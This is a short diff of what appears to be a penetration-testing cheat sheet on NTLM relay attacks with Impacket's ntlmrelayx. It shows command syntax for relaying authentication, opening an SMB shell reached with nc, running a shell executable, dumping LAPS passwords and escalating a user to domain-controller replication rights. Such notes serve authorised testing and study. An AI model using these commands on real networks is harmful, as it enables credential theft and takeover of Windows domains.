@@ -17,7 +17,8 @@ Invoke this attack: request callback to SMB on kali using `\\IP`
         3. Retores RemoteRegistry back to disabled state.
 
 ```bash
-ntlmrelayx.py [-6] [-t TARGET | -tf TARGET_FILE] -smb2support [-l LOOT_DIR] [-i] [-e "SHELL.exe"] [-c "COMMANDS"]
+impacket-ntlmrelayx [-6] [-t TARGET | -tf TARGET_FILE] -smb2support [-l LOOT_DIR] [-i] [-e "SHELL.exe"] [-c "COMMANDS"]
+--escalate-user USER: will escalate to add ACL Replication-Get-Changes-All for USER on DC 
 # -6: IPv6
 # -i: will open a smb shell, can connect using nc IP PORT
 # --dump-laps: dump LAPS passwords
